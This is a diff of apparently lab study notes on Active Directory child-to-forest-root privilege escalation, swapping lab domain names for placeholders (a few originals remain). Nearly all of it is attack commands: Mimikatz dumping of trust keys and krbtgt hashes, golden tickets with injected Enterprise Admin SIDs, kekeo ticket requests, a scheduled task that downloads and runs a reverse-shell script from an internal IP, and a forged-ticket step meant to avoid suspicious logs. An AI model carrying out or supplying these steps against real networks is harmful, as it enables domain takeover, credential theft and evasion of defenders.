@@ -4,7 +4,7 @@ Across Forests - Trust relationship needs to be established.
 
 --Child to Parent
 
-* Child to Forest Root (dollarcorp.moneycorp.local --> moneycorp.local)
+* Child to Forest Root (subdomain.domain.local --> domain.local)
 
 * Domains in the same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains.
 
@@ -25,28 +25,28 @@ Across Forests - Trust relationship needs to be established.
 
 
 
--Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
+-Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName DC
 
 or
 
--Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
+-Invoke-Mimikatz -Command '"lsadump::dcsync /user:SUBDOMAIN\domain$"'
 
-and then: (to get the group SID run 'Get-DomainGroup "Enterprise Admins" -Domain moneycorp.local')
+and then: (to get the group SID run 'Get-DomainGroup "Enterprise Admins" -Domain domain.local')
 
---Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:domainSID /sids:groupSID(enterpriseadmins/DA) /rc4:hashfromlsadump /service:krbtgt /target:moneycorp.local /ticket:C:\path\to\store.kirbi
+--Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:subdomain.domain.local /sid:domainSID /sids:groupSID(enterpriseadmins/DA) /rc4:hashfromlsadump /service:krbtgt /target:moneycorp.local /ticket:C:\path\to\store.kirbi
 
 then: (from kekeo_old) - This could be executed from a low-privileged powershell
 
-.\asktgs.exe C:\path\to\store.kirbi CIFS(or HOST to attempt RCE)/mcorp-dc.moneycorp.local
+.\asktgs.exe C:\path\to\store.kirbi CIFS(or HOST to attempt RCE)/DOMAIN-DC.domain.local
 
-* CIFS CASE - \\mcorp-dc\c$ is available
+* CIFS CASE - \\DOMAIN-DC\c$ is available
 
 * HOST CASE - schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "whateverName" /TR "powershell.exe -c 'iex(New-Object Net.WebClient).DownloadString(''http://172.16.100.71/Invoke-PowerShellTcp.ps1''')'"
 ** schtasks /Run /S mcorp-dc.moneycorp.local /TN "whateverName"
 
 then: (also from kekeo_old)
 
-.\kirbikator.exe lsa .\host.mcorp-dc.moneycorp.local.kirbi
+.\kirbikator.exe lsa .\host.DOMAIN-DC.domain.local.kirbi
 
 klist
 
@@ -60,13 +60,13 @@ able to execute CIFS CASE and HOST CASE commands now, from a low privileged powe
 -----DOMAIN ADMIN PRIVILEGES
 
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' on the DC (get krbtgt hash) or
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:subdomain\krbtgt"'
 
 ---Can from a low-priv powershell window:
 
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:domainSID /sids:groupSID(enterpriseadmins/DA) /krbtgt:krbtgtHash /ticket:C:\path\to\store.kirbi
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:subdomain.domain.local /sid:domainSID /sids:groupSID(enterpriseadmins/DA) /krbtgt:krbtgtHash /ticket:C:\path\to\store.kirbi
 
-In the above command, the mimikatz option "/sids" is forcefully setting the SID History for the Enterprise Admins/Domain Admins group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin/Domain Admin group.
+In the above command, the mimikatz option "/sids" is forcefully setting the SID History for the Enterprise Admins/Domain Admins group for subdomain.domain.local that is the Forest Enterprise Admin/Domain Admin group.
 
 then:
 
@@ -74,11 +74,11 @@ Invoke-Mimikatz -Command '"kerberos::ptt C:\path\to\store.kirbk"'
 
 klist
 
-ls \\mcorp-dc\c$
+ls \\DOMAIN-DC\c$
 
-gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
+gwmi -class win32_operatingsystem -ComputerName DOMAIN-DC.domain.local
 
 ---Avoid suspicious logs
 
-Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:domainSID /groups:516 /sids:Domain Controllers,S-1-5-9(Enterprise Domain Cotrollers) /krbtgt:krbtgtHash /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:subdomain.domain.local /sid:domainSID /groups:516 /sids:Domain Controllers,S-1-5-9(Enterprise Domain Cotrollers) /krbtgt:krbtgtHash /ptt"'
 
